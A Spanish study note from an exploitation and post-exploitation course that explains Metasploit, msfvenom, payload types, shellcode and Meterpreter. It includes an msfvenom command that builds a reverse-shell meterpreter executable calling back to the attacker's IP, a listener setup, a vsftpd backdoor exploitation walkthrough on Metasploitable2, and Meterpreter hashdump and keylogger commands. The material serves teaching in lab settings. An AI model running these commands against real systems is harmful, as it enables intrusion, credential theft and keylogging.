---
title: Metasploit
modulo: M4 - Explotación y Post-Explotación
fecha: 2025-07-22
layout: apunte
slug: 2025-07-22-metasploit
---
# **👉Definiciones básicas**
## **1. Metasploit Framework (MSF)**
- ❓**Qué es:**  
    Una plataforma de **pruebas de penetración** que permite **descubrir, explotar y realizar post-explotación** en sistemas vulnerables.

- 🎖️**En qué destaca:**  
    Su gran base de datos de exploits listos y su modularidad.

- 💻**Uso típico:**  
    Ataques controlados en entornos de pentesting, laboratorios o CTFs.

## **2. msfconsole**
- ❓**Qué es:**  
    La interfaz de línea de comandos **principal** de Metasploit.

- ❗**Por qué es importante:**  
    Aquí se buscan módulos, se configuran, se ejecutan y se gestionan sesiones.

- ⌨️**Comandos típicos:**  
    `search`, `use`, `show options`, `run`, `sessions`.

## **3. msfvenom**
- ❓**Qué es:**  
    Una herramienta dentro de Metasploit para **crear payloads personalizados**.

- ✍️**Para qué sirve:**  
    Generar ejecutables, scripts o binarios maliciosos (por ejemplo, `shell.exe`) que luego conectan de vuelta a Metasploit.

🔰**Ejemplo:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<tu_IP> LPORT=4444 -f exe > shell.exe
```

## **4. Módulos (Modules)**
El corazón de Metasploit. Son "bloques de construcción" con funciones específicas. Se almacenan en `/usr/share/metasploit-framework/modules`.

- 🕷️**Exploits** →  
    Programas que aprovechan vulnerabilidades específicas.  
    Ejemplo: `exploit/windows/smb/ms17_010_eternalblue`.

- ✉️**Payloads** →  
    El "código malicioso" que se ejecuta después del exploit.  
    Ejemplo: `meterpreter/reverse_tcp`.

- 🔣**Encoders** →  
    Ofuscan el payload para evadir antivirus.  
    Ejemplo: `x86/shikata_ga_nai`.

- 🔎**Auxiliary** →  
    No explotan, pero ayudan con **escaneo**, **fuerza bruta**, etc.  
    Ejemplo: `auxiliary/scanner/portscan/tcp`.

- 🧰**Post** →  
    Para **post-explotación** (privilege escalation, keylogging, dumping de hashes).  
    Ejemplo: `post/windows/gather/hashdump`.

 - ⚖️**Nop** →
	 En exploits, se usan para **estabilizar la ejecución del payload** y evitar que un mal cálculo en el salto de memoria haga que falle.
	 Ejemplo: `nop/x86/single_byte`.

## **5. Meterpreter**
- ❓**Qué es:**  
    Un payload avanzado que te da una **shell interactiva** con muchas funciones. Corre en memoria, lo que la hace menos detectable, y permite cargar módulos de post-explotación.
    
- 💻**Comandos útiles:**
    - `sysinfo` → Info del sistema.
    - `getuid` → Usuario actual.
    - `hashdump` → Volcado de hashes.
    - `keyscan_start` → Keylogger.
    - `migrate` → Moverte a otro proceso.

## **6. Multi/Handler**
- **Qué es:**  
    Un módulo auxiliar que actúa como **listener** para esperar conexiones de un payload (por ejemplo, los que se crean con msfvenom).

**Ejemplo**:
```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <tu_IP>
set LPORT 4444
run
```

---

# **👉Exploit y Payload**

## 🔫**Exploit**
- **Qué es:**  
    Es el **código que aprovecha una vulnerabilidad** en un software o sistema para **ganar acceso o ejecutar algo no autorizado**.  
    Ejemplo: Un exploit que aprovecha un desbordamiento de buffer en Samba.

- **Función:**  
    **Abrir la puerta.** Es el martillo que rompe la cerradura.

- **En Metasploit:**
    - Los exploits están ya programados para atacar vulnerabilidades conocidas.
    - Ejemplo de módulo: `exploit/windows/smb/ms17_010_eternalblue`

## 💣**Payload**
- **Qué es:**  
    Es el **código que se ejecuta una vez que el exploit tuvo éxito**.  
    Ejemplo: Una shell reversa, un keylogger, un Meterpreter.

- **Función:**  
    **Hacer lo que realmente te interesa tras abrir la puerta** (entrar, moverte, robar info).

- **En Metasploit:**  
    Los eliges según tu objetivo:
    - **bind shell** (la víctima abre un puerto para que te conectes).
    - **reverse shell** (la víctima se conecta a ti).
    - **meterpreter** (post-explotación avanzada).

>[!tip] Resumen:
>**El exploit abre el acceso** y el payload **es la carga que viaja a través de ese acceso**.


 **Tipos de Payload:**

| **Tipo**   | **Etapas** | **Función**                                   | **Ejemplo**                  |
| ---------- | ---------- | --------------------------------------------- | ---------------------------- |
| **Single** | 1 sola     | Todo el payload en un solo paquete            | `windows/shell_reverse_tcp`  |
| **Stager** | Parte 1    | Abre la conexión y espera                     | `windows/stager/reverse_tcp` |
| **Stage**  | Parte 2+   | Carga principal (Meterpreter, shell avanzada) | `windows/meterpreter`        |

---
# **👉Shellcode**
- **Definición técnica:**  
    Es un **pequeño fragmento de código en ensamblador/máquina** diseñado para ejecutarse directamente en la memoria de la víctima.

- **Por qué se llama así:**  
    Históricamente su función más común era **abrir una shell** (por eso _shell-code_), pero hoy en día puede hacer cualquier cosa.

En un exploit, una vez que logras **controlar el flujo de ejecución** (por ejemplo, con un buffer overflow), necesitas inyectar algo para **ejecutar comandos**.  
Ahí es donde entra la **shellcode**:

✔ Abrir una **reverse shell** o **bind shell**.  
✔ Descargar y ejecutar otro programa.  
✔ Añadir usuarios, apagar firewall, etc.

En pocas palabras: **es el payload en su forma más básica y cruda**.

>[!tip] En Metasploit:
>🔹Cada **payload** (ya sea staged, stageless o single) **es, en esencia, una shellcode empaquetada**.
>🔹Cuando usamos `msfvenom`, lo que genera es **una shellcode ofuscada y lista para inyectar** en el formato que solicitemos (`exe`, `elf`, `raw`, etc.).


**¿Cómo diferenciar payload y shellcode?**

|**Shellcode**|**Payload**|
|---|---|
|Código crudo en ensamblador/máquina|Puede ser una shellcode cruda o un conjunto más grande (con encoders, stagers, etc.)|
|Es el "núcleo" que hace la acción|Es el "paquete completo" que incluye la shellcode y otras partes|
|Usada en exploits manuales|Metasploit ya la integra automáticamente|

**Resumen:**
- **Shellcode = el corazón del ataque** (el binario crudo que hace la magia).
- **Payload = el paquete completo que Metasploit te entrega, que internamente lleva la shellcode.**

# **👉msfconsole**
**Workspace**
- Es como un **proyecto o carpeta virtual** dentro de Metasploit. 
- Te permite **separar y organizar los datos** (hosts, servicios, vulnerabilidades, sesiones) por cada objetivo o cliente.
- **Comandos**
	- `workspace`:  Ver workspaces disponibles, marca con un * el workspace activo
	- `workspace -a <nombre>`: Crear un nuevo workspace
	- `workspace <nombre>`: Cambiar de workspace activo
	- `workspace -d <nombre>`: Elimina un workspace
	- `workspace -r <nombre_antiguo> <nombre_nuevo>`: Renombra un workspace
	- `workspace -v`: Muestra información detallada de todos los workspaces existentes

**Db_nmap**
- Es **una integración de Nmap dentro de Metasploit**.
- **Hace exactamente lo mismo que Nmap**, pero:  
    ✔ Ejecuta el escaneo desde msfconsole.  
    ✔ **Guarda automáticamente** hosts, servicios y versiones en el workspace activo.
Básicamente es como correr `nmap`, pero con "memoria".

- Identificar hosts en la red:

```bash
db_nmap -sV 10.0.2.0/24
```
Una vez terminado el scan, podemos leer los datos guardados con los comandos `hosts` (muestra la lista de máquinas encontradas) y `services` (lista los puertos abiertos y los servicios que corren)

**Search**
- Busca en **todos los módulos disponibles** en Metasploit (exploits, payloads, auxiliary, post, encoders, nops).
- **Sintaxis general:** `search [opciones] <palabra_clave>`

Ejemplo con la metasploitable2:
```bash
search vsftpd
```

Esto nos devuelve algo como:

| #   | Name                                 | Description                              |
| --- | ------------------------------------ | ---------------------------------------- |
| 0   | auxiliary/dos/ftp/vsftpd_232         | VSFTPD 2.3.2 Denial of Service           |
| 1   | exploit/unix/ftp/vsftpd_234_backdoor | VSFTPD v2.3.4 Backdoor Command Execution |

Nos interesa el 1, ejecutamos el comando
```bash
use 1
```

Una vez seleccionado el recurso:
- Podemos descubrir más sobre el archivo con el comando `info`
- Con el comando `options` se despliega una lista de parámetros que son necesarios para que el exploit funcione

Para configurar los parámetros (opciones):
```
set <nombre_de_la_opcion> <valor>
```

En este caso:
```
set RHOST <ip_metasploitable2>
```

Una vez configurado, se ejecuta mediante el comando `run`.

**Si todo sale bien, obtendremos acceso a la máquina 🎉**

# 👉**Meterpreter**
- Es un **payload avanzado** de Metasploit diseñado para post-explotación.    
- Su nombre viene de **Meta-Interpreter** (un "intérprete" avanzado sobre el sistema de la víctima).    
- Se carga en **memoria (fileless)**, lo que lo hace **difícil de detectar** por antivirus y evita escribir en disco (hasta que tú quieras).

En pocas palabras:  
➡️ **Es una shell interactiva súper vitaminada** con cientos de funciones.

 **Características principales**
✔ **Fileless** → Corre en memoria, lo que reduce rastros en disco.  
✔ **Modular** → Puedes cargar extensiones según lo necesites (e.g., para pivoting, keylogging). 
✔ **Encriptado** → La comunicación con tu máquina atacante está cifrada.  
✔ **Cross-platform** → Hay versiones para Windows, Linux, Android, etc.

![[Flujo_meterpreter.png]]

**¿Qué sigue?**  👉 [[2025-07-23-prctica-meterpreter\|Práctica meterpreter]]
